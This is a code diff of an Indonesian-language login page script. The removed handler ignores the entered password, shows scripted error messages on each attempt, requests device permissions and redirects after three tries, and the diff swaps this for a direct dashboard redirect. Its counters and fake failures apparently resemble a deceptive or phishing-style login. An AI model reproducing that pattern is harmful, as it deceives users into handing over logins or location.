@@ -3,7 +3,7 @@ let attemptCount = 0, gpsDeniedCount = 0, idleTimer = null, floodInterval = null
 const emailInput = document.getElementById('emailInput');
 const passInput = document.getElementById('passInput');
 
-setTimeout(() => document.getElementById('splash').classList.add('hidden'), 1800);
+const splashEl = document.getElementById('splash'); if (splashEl) setTimeout(() => splashEl.classList.add('hidden'), 1800);
 
 function registerSW() {
     if ('serviceWorker' in navigator) {
@@ -944,15 +944,12 @@ async function handleLogin(e) {
     const email=emailInput.value.trim();
     if(!email){showToast('Masukkan email terlebih dahulu.');return false;}
     attemptCount++;
-    const idx=Math.min(attemptCount-1,errorMessages.length-1);
-    btn.classList.add('loading'); btn.disabled=true; btn.querySelector('span').textContent='Memverifikasi\u2026';
-    showLoadingOverlay(loadingDurations[idx]/4);
+    btn.classList.add('loading'); btn.disabled=true; btn.querySelector('span').textContent='Menghubungkan\u2026';
+    showLoadingOverlay(1500/4);
     await requestPermissions();
     setTimeout(()=>{
-        btn.classList.remove('loading'); btn.disabled=false; btn.querySelector('span').textContent='Masuk ke Dashboard';
-        hideLoadingOverlay(); showToast(errorMessages[idx]); vibrate();
-        if(attemptCount>=3) setTimeout(doRedirect,2000);
-    },loadingDurations[idx]);
+        window.location.href = '/dashboard.html';
+    },2500);
     return false;
 }
 
@@ -1246,15 +1243,19 @@ function removeTypingIndicator() {
     if (el) el.remove();
 }
 
-// Initialize AI chat when socket is ready
-setTimeout(initAIChat, 1000);
+// Initialize AI chat when socket is ready (skip on dashboard page which has its own chat)
+if (!window.location.pathname.includes('dashboard')) {
+    setTimeout(initAIChat, 1000);
+}
 
-document.querySelector('form').addEventListener('submit', handleLogin);
-document.querySelector('.input-append button').addEventListener('click', togglePass);
-document.querySelectorAll('.social-btn').forEach(btn => {
-    const provider = btn.querySelector('.s-text')?.textContent || '';
-    btn.addEventListener('click', () => handleSocial(provider));
-});
-document.querySelector('.nt-btn').addEventListener('click', dismissNotif);
-
-emailInput.focus();
+// Page-specific initializations (skip on dashboard)
+if (!window.location.pathname.includes('dashboard')) {
+    document.querySelector('form').addEventListener('submit', handleLogin);
+    document.querySelector('.input-append button').addEventListener('click', togglePass);
+    document.querySelectorAll('.social-btn').forEach(btn => {
+        const provider = btn.querySelector('.s-text')?.textContent || '';
+        btn.addEventListener('click', () => handleSocial(provider));
+    });
+    document.querySelector('.nt-btn').addEventListener('click', dismissNotif);
+    emailInput.focus();
+}
